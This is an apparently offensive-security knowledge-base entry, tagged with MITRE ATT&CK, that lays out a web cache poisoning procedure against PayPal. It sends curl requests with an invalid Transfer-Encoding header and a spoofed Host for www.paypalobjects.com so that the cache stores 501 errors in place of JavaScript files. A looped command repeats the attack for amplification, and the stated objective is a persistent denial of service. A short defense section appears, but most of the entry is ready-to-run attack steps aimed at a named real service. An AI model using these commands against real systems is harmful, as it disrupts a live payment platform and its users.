---
tags:
  - web-cache-poisoning
  - dos
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-send-invalid-transfer-encoding]]'
platforms:
  - Web
techniques:
  - '[[Endpoint Denial of Service]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: a41b3aa1-cde8-4cc4-af84-e37ad57e4c14
created_at: '2025-12-11T06:10:40.121Z'
updated_at: '2025-12-11T06:10:40.121Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0040]]'
mitre_techniques:
  - '[[T1499]]'
---
# Craft and Send Poisoning Request

## Summary

This procedure details crafting and sending HTTP requests with invalid Transfer-Encoding headers to poison the web cache, replacing legitimate JavaScript files with error messages on PayPal's infrastructure.

## Description

By targeting the handling of Transfer-Encoding headers, attackers can force the cache to store a '501 Not Implemented' error for resources from www.paypalobjects.com, disrupting core functionality of paypal.com and causing DoS.

## Requirements

1. Target URL and resource paths
2. Tool for sending custom HTTP requests
3. Understanding of cache keys and poisoning techniques

## Defense

Defensive measures and detection strategies:

- Use cache key normalization to prevent poisoning
- Log and alert on invalid header attempts

## Objectives

1. Poison specific cached resources
2. Achieve persistent DoS effect
3. Validate exploitation success

## Instructions

### Step 1: Craft Request

**Context**: Prepare a request with invalid Transfer-Encoding and targeted Host header.

**Command** ([[commands/curl-send-invalid-transfer-encoding]]):

```bash
curl -H "Transfer-Encoding: chunked invalid" -H "Host: www.paypalobjects.com" https://www.paypal.com/path/to/js/file
```

> This injects the error into the cache for the specified JavaScript file.

### Step 2: Repeat for Amplification

**Context**: Send multiple requests to ensure cache poisoning takes effect.

**Command** ([[commands/curl-send-invalid-transfer-encoding]]):

```bash
for i in {1..5}; do curl -H "Transfer-Encoding: chunked invalid" https://www.paypal.com/path/to/js/file; done
```

> Increases the likelihood of successful poisoning.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques



## Commands Used

- [[commands/curl-send-invalid-transfer-encoding]]

## Tools Used

- [[tools/curl]]

## Tags

- [[web-cache-poisoning]]
- [[dos]]
